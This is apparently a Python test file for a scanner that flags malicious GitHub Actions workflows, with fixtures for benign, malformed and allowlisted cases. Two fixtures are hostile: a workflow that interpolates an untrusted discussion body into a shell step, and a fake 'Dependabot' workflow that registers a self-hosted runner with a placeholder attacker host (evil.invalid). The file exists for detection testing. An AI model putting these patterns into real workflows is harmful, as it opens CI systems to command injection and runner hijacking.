#!/usr/bin/env python3
"""GitHub Actions workflow persistence / camouflage signatures (#1091).

Detection + confidence (heuristic → SUSPICIOUS) + scoping-to-.github/workflows + malformed-YAML
safety + allowlist, all against inert workflow YAML.
"""
from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.models import SUSPICIOUS, CLEAN
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions

SIGS = load_signatures()

# A Discussion-triggered injection workflow. NOTE the bareword `on:` — PyYAML parses that key as
# the boolean True (YAML 1.1), which is exactly how real workflows are written, so this also
# exercises the True-key handling that naive `data.get("on")` would miss.
INJECTION = """\
name: triage
on:
  discussion:
    types: [created]
jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.discussion.body }}" >> notes.txt
"""

DEPENDABOT_IMPOSTER = """\
name: Dependabot Auto Merge
on: push
jobs:
  merge:
    runs-on: [self-hosted, linux, x64]
    steps:
      - run: ./config.sh --url https://evil.invalid --token AAA && ./run.sh
"""

CLEAN_PUSH = """\
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "PR #${{ github.event.pull_request.number }}"; make test
"""

MALFORMED = "name: [oops\n  ::: not: valid: yaml\n   - broken"


def _scan(files, allow=None):
    d = Path(tempfile.mkdtemp())
    for rel, content in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return scan_target(LocalRepoTarget(d, "t", ScanOptions()), SIGS, allow or [])


class TestWorkflowMatcher(unittest.TestCase):
    def test_discussion_injection_is_suspicious(self):
        r = _scan({".github/workflows/triage.yml": INJECTION})
        self.assertIn("workflow-injection-run", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, SUSPICIOUS)   # heuristic — never INFECTED on its own

    def test_bareword_on_trigger_is_read(self):
        # Regression guard for the PyYAML `on:` → True footgun: detection must still fire when the
        # trigger key is the boolean True (the natural, unquoted form) rather than the string "on".
        self.assertIn(True, __import__("yaml").safe_load(INJECTION))   # the fixture really has it
        r = _scan({".github/workflows/triage.yml": INJECTION})
        self.assertTrue(r.findings, "must detect injection despite on: parsing as boolean True")

    def test_dependabot_impersonation_is_suspicious(self):
        r = _scan({".github/workflows/dependabot-updates.yml": DEPENDABOT_IMPOSTER})
        self.assertIn("workflow-dependabot-impersonation", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, SUSPICIOUS)

    def test_benign_push_workflow_is_clean(self):
        # A normal CI workflow that only reads a vetted numeric field (.number) under a safe
        # trigger must NOT flag — no false positive.
        r = _scan({".github/workflows/ci.yml": CLEAN_PUSH})
        self.assertEqual([f.signature_id for f in r.findings], [])
        self.assertEqual(r.verdict, CLEAN)

    def test_safe_leaf_under_dangerous_trigger_is_clean(self):
        # Dangerous trigger but the interpolated field is a non-injectable id (.number) → no fire.
        r = _scan({".github/workflows/triage.yml": INJECTION.replace("discussion.body",
                                                                     "discussion.number")})
        self.assertEqual([f.signature_id for f in r.findings], [])

    def test_only_github_workflows_dir_inspected(self):
        # The exact injection content in a non-workflow YAML elsewhere must produce no finding.
        r = _scan({"config.yml": INJECTION, "deploy/settings.yaml": INJECTION})
        self.assertEqual([f.signature_id for f in r.findings], [])
        self.assertEqual(r.verdict, CLEAN)

    def test_malformed_yaml_does_not_crash(self):
        r = _scan({".github/workflows/broken.yml": MALFORMED})
        self.assertIsNone(r.error, f"scan must not error on malformed YAML: {r.error}")
        self.assertEqual([f.signature_id for f in r.findings], [])

    def test_dependabot_named_but_benign_is_clean(self):
        # A real dependabot-auto-merge helper (github-hosted, only calls gh) must NOT be flagged
        # as an impostor — the malicious-behaviour gate (self-hosted / remote-fetch / injection)
        # is what separates camouflage from a legit helper.
        benign_dep = ("name: Dependabot auto-merge\non: pull_request_target\njobs:\n"
                      "  merge:\n    runs-on: ubuntu-latest\n    steps:\n"
                      "      - run: gh pr merge --auto \"$PR_URL\"\n")
        r = _scan({".github/workflows/dependabot-merge.yml": benign_dep})
        self.assertNotIn("workflow-dependabot-impersonation", {f.signature_id for f in r.findings})

    def test_allowlist_suppresses_by_signature(self):
        r = _scan({".github/workflows/triage.yml": INJECTION},
                  allow=[{"signature": "workflow-injection-run",
                          "path_glob": ".github/workflows/*.yml"}])
        self.assertNotIn("workflow-injection-run", {f.signature_id for f in r.findings})


if __name__ == "__main__":
    unittest.main()
